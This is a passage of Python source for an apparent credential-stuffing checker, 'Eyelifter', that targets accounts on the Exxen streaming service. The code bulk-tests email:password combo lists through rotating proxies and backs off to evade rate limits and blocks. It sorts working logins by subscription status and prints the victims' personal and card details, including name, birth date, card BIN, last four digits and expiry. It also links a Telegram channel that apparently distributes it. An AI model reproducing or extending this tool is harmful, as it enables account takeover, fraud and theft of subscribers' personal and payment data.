                if not is_last:
                    _eyelifter_stats["retries"] += 1
            rl_hits += 1
            if rl_hits > MAX_RATE_LIMIT_RETRIES:
                break
            await asyncio.sleep(RATE_LIMIT_BACKOFF * (2 ** (rl_hits - 1)))
            if proxy:
                Eyelifter_mark_bad(proxy)
            continue

        if et == "block":
            with _eyelifter_lock:
                _eyelifter_stats["blocks"] += 1
                if not is_last:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(1)
            continue

        if et in ("proxy", "timeout"):
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            if proxy:
                Eyelifter_mark_bad(proxy)
            await asyncio.sleep(CONFIG.get("retry_delay", 2))
            continue

        if et.startswith("http_") or et.startswith("api_") or et == "parse":
            if not is_last:
                with _eyelifter_lock:
                    _eyelifter_stats["retries"] += 1
            await asyncio.sleep(CONFIG.get("retry_delay", 2))
            continue

        if not is_last:
            with _eyelifter_lock:
                _eyelifter_stats["retries"] += 1
        await asyncio.sleep(CONFIG.get("retry_delay", 2))

    return result or {"status": "error", "error_type": "no_result",
                      "message": "no result"}


def Eyelifter_record(combo, result):
    Eyelifter_verify("record")
    global _eyelifter_hits_f, _eyelifter_free_f, _eyelifter_expired_f
    global _eyelifter_bad_f, _eyelifter_err_f
    st = result.get("status", "unknown")

    with _eyelifter_lock:
        _eyelifter_stats["checked"] += 1
        done = _eyelifter_stats["checked"]
        if st == "hit":
            _eyelifter_stats["hits"] += 1
        elif st == "free":
            _eyelifter_stats["free"] += 1
        elif st == "expired":
            _eyelifter_stats["expired"] += 1
        elif st == "bad":
            _eyelifter_stats["bad"] += 1
        else:
            _eyelifter_stats["errors"] += 1

    total = _eyelifter_total

    if st in ("hit", "free", "expired"):
        u = result.get("user", {}) or {}
        full = Eyelifter_fmt_line(combo, u, st)
        if st == "hit":
            print(f"\n[{done}/{total}] {Eyelifter_color('32', full, True)}\n")
            Eyelifter_safe_write(_eyelifter_hits_f, full + "\n\n")
        elif st == "free":
            Eyelifter_safe_write(_eyelifter_free_f, full + "\n\n")
        else:
            Eyelifter_safe_write(_eyelifter_expired_f, full + "\n\n")
    elif st == "bad":
        Eyelifter_safe_write(_eyelifter_bad_f, f"{combo} | invalid credentials\n")
    else:
        et = result.get("error_type", "unknown")
        msg = result.get("message", "unknown")
        Eyelifter_safe_write(_eyelifter_err_f, f"{combo} | {et} | {msg}\n")

    Eyelifter_update_title()


async def Eyelifter_bulk_runner(combos):
    Eyelifter_verify("bulk_runner")
    queue = asyncio.Queue()
    for c in combos:
        queue.put_nowait(c)

    lock = asyncio.Lock()
    gap = CONFIG.get("combo_delay", 0)
    last_ts = [0.0]
    ts_lock = asyncio.Lock()

    async def worker():
        while True:
            if _eyelifter_stop.is_set():
                return
            try:
                combo = queue.get_nowait()
            except asyncio.QueueEmpty:
                return

            if gap > 0:
                async with ts_lock:
                    now = time.time()
                    delta = now - last_ts[0]
                    wait = max(0.0, gap - delta)
                    last_ts[0] = now + wait
                if wait > 0:
                    await asyncio.sleep(wait)

            if _eyelifter_stop.is_set():
                return

            proxy = Eyelifter_pick_proxy()
            try:
                result = await Eyelifter_run_with_retries(combo, proxy)
            except Exception as e:
                result = {"status": "error", "error_type": "runner_crash",
                          "message": str(e)[:120]}

            async with lock:
                try:
                    Eyelifter_record(combo, result)
                except Exception as e:
                    print(f"[RECORD-FAIL] {combo[:30]}: {e}", flush=True)

            queue.task_done()

    n = max(1, CONFIG["threads"])
    workers = [asyncio.create_task(worker()) for _ in range(n)]
    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        for w in workers:
            w.cancel()
        raise


def Eyelifter_single_check(proxies):
    Eyelifter_verify("single_check")
    global _eyelifter_pool, _eyelifter_bad
    _eyelifter_stop.clear()
    Eyelifter_section("SINGLE CHECK")
    combo = input(f"{Eyelifter_color('96', '[*] Enter email:password: ')}").strip()
    if ":" not in combo:
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if proxies:
        if not _eyelifter_pool:
            _eyelifter_pool = list(proxies)
            _eyelifter_bad = set()
        proxy = Eyelifter_pick_proxy()
    else:
        proxy = None

    if proxy:
        Eyelifter_log("🌐", "INFO", "PROXY", "using proxy")
    else:
        Eyelifter_log("🌐", "INFO", "PROXY", "direct connection")

    Eyelifter_log("🔍", "STEP", "CHECK", f"checking {combo.split(':')[0]}...")
    start = time.time()
    result = asyncio.run(Eyelifter_run_with_retries(combo, proxy))
    elapsed = time.time() - start

    if result.get("status") in ("hit", "free", "expired"):
        u = result.get("user", {}) or {}
        verdict = {"hit": "SUBSCRIBER", "free": "FREE",
                   "expired": "EXPIRED"}.get(result["status"], result["status"])
        rows = [
            ("Status", verdict),
            ("Email", u.get("email", "-")),
            ("Password", u.get("password", "-")),
            ("Name", f"{u.get('name', '')} {u.get('surname', '')}".strip()),
            ("Country", u.get("country", "-")),
            ("User ID", u.get("user_id", "-")),
            ("Account Type", u.get("account_type", "-")),
            ("API Client ID", u.get("api_client_id", "-")),
            ("Email Verified", "Yes" if u.get("email_verified") else "No"),
            ("Mobile Verified", "Yes" if u.get("mobile_verified") else "No"),
            ("Gender", u.get("gender", "-")),
            ("Birth Date", u.get("birth_date", "-")),
            ("Plan", u.get("plan_name", "-")),
            ("Plan Asset", u.get("plan_asset", "-")),
            ("Bundle", u.get("bundle", "-")),
            ("Grade", u.get("grade", "-")),
            ("License", u.get("license_name", "-")),
            ("License Asset", u.get("license_asset", "-")),
            ("License Type", u.get("license_type", "-")),
            ("Product Type", u.get("product_type", "-")),
            ("Session Control", u.get("session_control", "-")),
            ("Has Ads", u.get("has_ad", "-")),
            ("Started", u.get("start_date", "-")),
            ("Expires", u.get("end_date", "-")),
            ("Active", "Yes" if u.get("expired") == "NO" else ("No" if u.get("expired") == "YES" else "-")),
            ("Days Left", str(u.get("days_left", 0))),
            ("Real Days Left", str(u.get("real_days", 0))),
            ("Grace End", u.get("grace_end", "-")),
            ("Recurring", u.get("is_recurring", "-")),
            ("Renewal Count", str(u.get("renewal_count", 0))),
            ("Max Renewal", str(u.get("max_renewal", 0))),
            ("Retry Count", str(u.get("retry_count", 0))),
            ("Failed Reason", str(u.get("failed_reason", 0))),
            ("Failed Message", u.get("failed_msg", "-") or "-"),
            ("Sub Active", u.get("sub_active", "-")),
            ("Sub Package", u.get("sub_package", "-")),
            ("Sub License", u.get("sub_license", "-")),
            ("Purchase Date", u.get("purchase_date", "-")),
            ("Sub Expire", u.get("sub_expire", "-")),
            ("Grace Expire", u.get("grace_expire", "-")),
            ("On Hold", u.get("on_hold", "-")),
            ("Pending Agreements", str(u.get("pending_agreements", 0))),
            ("Card Brand", u.get("card_brand", "-")),
            ("Card BIN", u.get("card_bin8", "-")),
            ("Card Last 4", u.get("card_last4", "-")),
            ("Card Raw", u.get("card_bin", "-")),
            ("Card Expire", u.get("card_expire", "-")),
            ("Currency", u.get("currency", "-")),
            ("Trial Used At", u.get("trial_used_at", "-")),
            ("Created", u.get("create_date", "-")),
            ("State", u.get("state", "-")),
            ("Session ID", u.get("session_id", "-")),
            ("Sub Count", str(u.get("sub_count", 0))),
            ("Package Options", u.get("package_options", "-") or "-"),
            ("Time", f"{elapsed:.2f}s"),
            ("Checked By", AUTHOR_TAG),
        ]        
        Eyelifter_summary(rows)
    else:
        st = result.get("status", "unknown")
        et = result.get("error_type", "")
        msg = result.get("message", "no details")
        if st == "bad":
            Eyelifter_log("❌", "ERROR", "RESULT", "invalid credentials")
        else:
            Eyelifter_log("❌", "ERROR", "RESULT", f"{st} [{et}] – {msg}")

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_bulk_check(proxies):
    Eyelifter_verify("bulk_check")
    global _eyelifter_total, _eyelifter_hits_f, _eyelifter_free_f
    global _eyelifter_expired_f, _eyelifter_bad_f, _eyelifter_err_f
    global _eyelifter_folder, _eyelifter_pool, _eyelifter_bad
    Eyelifter_reset_stats()
    Eyelifter_section("BULK CHECK")

    path = input(f"{Eyelifter_color('96', '[*] Enter combo file path: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "file not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    combos = sorted(Eyelifter_extract_combos(content))
    if not combos:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no valid combos")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(combos)} unique combos")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    _eyelifter_folder = os.path.join(RESULTS_FOLDER, f"Session_{ts}_{rand_tag}")
    os.makedirs(_eyelifter_folder, exist_ok=True)

    _eyelifter_hits_f = open(os.path.join(_eyelifter_folder, "exxen_hits.txt"), "w", encoding="utf-8")
    _eyelifter_free_f = open(os.path.join(_eyelifter_folder, "exxen_free.txt"), "w", encoding="utf-8")
    _eyelifter_expired_f = open(os.path.join(_eyelifter_folder, "exxen_expired.txt"), "w", encoding="utf-8")
    _eyelifter_bad_f = open(os.path.join(_eyelifter_folder, "exxen_bad.txt"), "w", encoding="utf-8")
    _eyelifter_err_f = open(os.path.join(_eyelifter_folder, "exxen_errors.txt"), "w", encoding="utf-8")

    header = (f"# Exxen Checker - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n"
              f"# Seal: {CREDIT_SEAL}\n\n")
    for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_expired_f,
               _eyelifter_bad_f, _eyelifter_err_f):
        fh.write(header)

    _eyelifter_total = len(combos)
    Eyelifter_log("📊", "INFO", "FILE", f"loaded {_eyelifter_total}")
    Eyelifter_log("⚙️", "INFO", "CONFIG",
                  f"threads:{CONFIG['threads']} timeout:{CONFIG['timeout']}s "
                  f"retries:{CONFIG['retries']} gap:{CONFIG['combo_delay']}s")

    if proxies:
        working = Eyelifter_get_working_proxies(proxies)
        if not working:
            Eyelifter_log("❌", "ERROR", "PROXY", "no working proxies — aborting")
            for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_expired_f,
                       _eyelifter_bad_f, _eyelifter_err_f):
                try:
                    fh.close()
                except Exception:
                    pass
            input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
            return
        _eyelifter_pool = working
        _eyelifter_bad = set()
    else:
        _eyelifter_pool = []
        _eyelifter_bad = set()
        Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

    _eyelifter_stop.clear()
    try:
        asyncio.run(Eyelifter_bulk_runner(combos))
    except KeyboardInterrupt:
        _eyelifter_stop.set()
        Eyelifter_log("🛑", "WARN", "STOP", "stopping...")
    except Exception as e:
        Eyelifter_log("❌", "ERROR", "RUN", f"{type(e).__name__}: {str(e)[:120]}")
    finally:
        for fh in (_eyelifter_hits_f, _eyelifter_free_f, _eyelifter_expired_f,
                   _eyelifter_bad_f, _eyelifter_err_f):
            try:
                fh.close()
            except Exception:
                pass

    for base, key in (
        ("exxen_hits.txt", "hits"), ("exxen_free.txt", "free"),
        ("exxen_expired.txt", "expired"), ("exxen_bad.txt", "bad"),
        ("exxen_errors.txt", "errors"),
    ):
        old = os.path.join(_eyelifter_folder, base)
        new = os.path.join(_eyelifter_folder, base.replace(".txt", f"_{_eyelifter_stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {_eyelifter_folder}")

    Eyelifter_divider()
    el = time.time() - _eyelifter_start
    Eyelifter_summary([
        ("Total", _eyelifter_total),
        ("Hits (paid)", _eyelifter_stats["hits"]),
        ("Free", _eyelifter_stats["free"]),
        ("Expired", _eyelifter_stats["expired"]),
        ("Bad creds", _eyelifter_stats["bad"]),
        ("Errors", _eyelifter_stats["errors"]),
        ("Rate limited", _eyelifter_stats["rate_limited"]),
        ("Blocks", _eyelifter_stats["blocks"]),
        ("Proxy fails", _eyelifter_stats["proxy_fails"]),
        ("Retries", _eyelifter_stats["retries"]),
        ("Time", f"{el:.1f}s"),
        ("Folder", _eyelifter_folder),
    ])

    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Debug:              {CONFIG['debug']}")
    print(f"  [11] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False

    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(200, int(input("Threads (1-200): "))))
            _loader.settings["threads"] = CONFIG["threads"]
            changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]
            changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]
            changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]
            changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]
            changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]
            changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]
            changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v
                changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]
            changed = True
        elif ch == "10":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]
            changed = True
        elif ch == "11":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    pass  # disabled in bot
    Eyelifter_banner(TOOL_NAME, "Exxen Account Validator")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single check")
        print("[2] Bulk check from file")
        print("[3] Settings")
        print("[4] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "4":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)